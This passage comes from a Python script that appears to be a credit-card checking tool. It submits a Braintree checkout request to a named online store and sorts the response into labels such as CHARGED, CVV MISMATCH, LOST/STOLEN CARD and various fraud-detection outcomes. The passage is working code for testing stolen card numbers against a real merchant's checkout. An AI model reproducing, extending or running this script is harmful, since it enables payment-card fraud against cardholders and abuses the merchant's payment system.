bWFya2V0aW5nX3RhY3RpYyB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX2VudHJ5IHdjX29yZGVyX2F0dHJpYnV0aW9uX3Nlc3Npb25fc3RhcnRfdGltZSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX3BhZ2VzIHdjX29yZGVyX2F0dHJpYnV0aW9uX3Nlc3Npb25fY291bnQgd2Nfb3JkZXJfYXR0cmlidXRpb25fdXNlcl9hZ2VudCBiYjMwZTU5IGUwMzgwNTkgYnJhaW50cmVlX2NjX25vbmNlX2tleSBicmFpbnRyZWVfY2NfZGV2aWNlX2RhdGEgYnJhaW50cmVlX2NjXzNkc19ub25jZV9rZXkgYnJhaW50cmVlX2NjX2NvbmZpZ19kYXRhIGJyYWludHJlZV9wYXlwYWxfbm9uY2Vfa2V5IGJyYWludHJlZV9wYXlwYWxfZGV2aWNlX2RhdGEgYnJhaW50cmVlX2FwcGxlcGF5X25vbmNlX2tleSBicmFpbnRyZWVfYXBwbGVwYXlfZGV2aWNlX2RhdGEgd29vY29tbWVyY2UtcHJvY2Vzcy1jaGVja291dC1ub25jZSBfd3BfaHR0cF9yZWZlcmVyIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6Mjh9fQ%3D%3D'
    
    response = r.post('https://relentlessdefender.com/', params=params_final, headers=headers_final, data=data_final, cookies=cookies_final)
    print(f"[7/7] Final checkout status: {response.status_code}")
    
    # ================ 7. PARSE RESULT ================
    print("\n[8/8] Parsing result...")
    
    try:
        result_data = json.loads(response.text)
        messages = result_data.get("messages", "")
        full_response = response.text
        print(f"[8/8] Response: {json.dumps(result_data, indent=2)[:500]}")
    except:
        print(f"[8/8] Raw response: {response.text[:500]}")
        return 'PARSE_ERROR'
    
    clean_messages = clean_html(messages)
    clean_full = clean_html(full_response)
    search_text = clean_messages + " " + clean_full
    
    reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
    reason = reason_match.group(1).strip() if reason_match else None
    
    print(f"\n[DEBUG] Clean response: {search_text[:300]}")
    
    # ==================== ردود Braintree الكاملة ====================
    
    if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
        return 'CHARGED'
    
    if 'insufficient funds' in search_text:
        return 'INSUFFICIENT FUNDS'
    
    if 'cvv' in search_text or 'cvv2 failure' in search_text or 'cvv verification failed' in search_text:
        return 'CVV MISMATCH'
    
    if 'expired card' in search_text:
        return 'EXPIRED CARD'
    
    if 'do not honor' in search_text:
        return 'DO NOT HONOR'
    
    if 'closed card' in search_text:
        return 'CLOSED CARD'
    
    if 'call issuer' in search_text:
        return 'CALL ISSUER'
    
    if 'pick up card' in search_text or 'pickup card' in search_text:
        return 'PICK UP CARD'
    
    if '3d secure' in search_text or 'three_d_secure' in search_text:
        return '3D SECURE REQUIRED'
    
    if 'limit exceeded' in search_text:
        return 'LIMIT EXCEEDED'
    
    if 'lost or stolen' in search_text:
        return 'LOST/STOLEN CARD'
    
    if 'address verification' in search_text or 'avs' in search_text:
        return 'ADDRESS MISMATCH'
    
    if 'processor declined' in search_text:
        return 'PROCESSOR DECLINED'
    
    if 'invalid card' in search_text:
        return 'INVALID CARD'
    
    if 'no account' in search_text:
        return 'NO ACCOUNT'
    
    if 'card not activated' in search_text:
        return 'CARD NOT ACTIVATED'
    
    if 'cannot authorize at this time' in search_text:
        return 'CANNOT AUTHORIZE (POLICY)'
    
    if 'card type is not accepted' in search_text:
        return 'CARD TYPE NOT ACCEPTED'
    
    if 'restriction on the card' in search_text:
        return 'CARD RESTRICTION'
    
    if 'cleantalk suspect' in search_text or 'cleantalk' in search_text:
        if 'fraud' in search_text:
            return 'CLEANTALK FRAUD SUSPECT'
        else:
            return 'CLEANTALK SUSPECT'
    
    if 'gateway rejected: fraud' in search_text:
        return 'GATEWAY REJECTED FRAUD'
    
    if 'risk_threshold' in search_text:
        return 'RISK THRESHOLD'
    
    if 'processor declined - fraud suspected' in search_text:
        return 'PROCESSOR DECLINED - FRAUD SUSPECTED'
    
    if 'call issuer. pick up card' in search_text:
        return 'CALL ISSUER - PICK UP CARD'
    
    if 'email does not exist' in search_text:
        return 'EMAIL DOES NOT EXIST'
    
    if 'fraud' in search_text or 'suspected fraud' in search_text:
        return 'SUSPECTED FRAUD'
    
    if 'order was detected as spam' in search_text or 'your order was detected as spam' in search_text:
        return 'ORDER DETECTED AS SPAM'
    
    if 'declined' in search_text:
        return 'DECLINED'
    
    if reason and len(reason) < 50:
        return reason.upper()
    
    if clean_messages and len(clean_messages) < 100:
        return clean_messages.title()
    
    return 'DECLINED'
